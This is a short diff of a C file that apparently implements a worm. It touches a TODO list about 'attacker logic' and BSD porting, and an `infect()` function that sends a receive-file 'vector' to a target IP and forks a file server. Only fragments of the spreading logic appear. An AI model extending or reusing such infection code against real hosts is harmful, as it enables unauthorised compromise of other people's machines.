@@ -1,6 +1,5 @@
 /*
 TODO:
-- add send_file_over_socket.c functionality to attacker logic. For some reason I thought we only needed receive_file.c on the target
 - ensure that the correct BSD versions of the files are being pulled in (they arent right now?)
 - ensure the "&" command actually runs the compiled programs (could use "./" instead?)
 - convert this file to old C so that this can be ran on BSD systems
@@ -201,7 +200,6 @@ void infect(char *ip, char *my_ip) {
 
 	// Send receive_file_bsd.c (vector) over
 	deploy_receive_file(sock, my_ip);
-
     
 	/* Fork to start file server, send files */
 	if (fork() == 0) {
